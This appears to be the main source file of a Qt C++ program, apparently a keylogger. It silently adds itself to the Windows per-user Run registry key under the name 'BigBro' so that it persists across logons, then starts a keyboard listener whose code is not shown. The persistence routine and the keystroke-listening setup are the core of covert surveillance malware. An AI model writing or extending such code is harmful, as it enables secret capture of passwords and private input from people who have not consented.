#include <QCoreApplication>
#include <QDir>
#include <QSettings>
#include <QDebug>
#include <QThread>

#include "keyboardlistner.h"



void makeAutorun()
{
#ifdef Q_OS_WIN
    {
        QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);

        settings.setValue("BigBro", QDir::toNativeSeparators(QCoreApplication::applicationFilePath()));
    }
#endif

    qDebug() << "Application in autorun now";
}


int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    qDebug() << "Application started";

    makeAutorun();



    KeyboardListner *listener = new KeyboardListner();

    int res = a.exec();
    delete listener;

    return res;
}
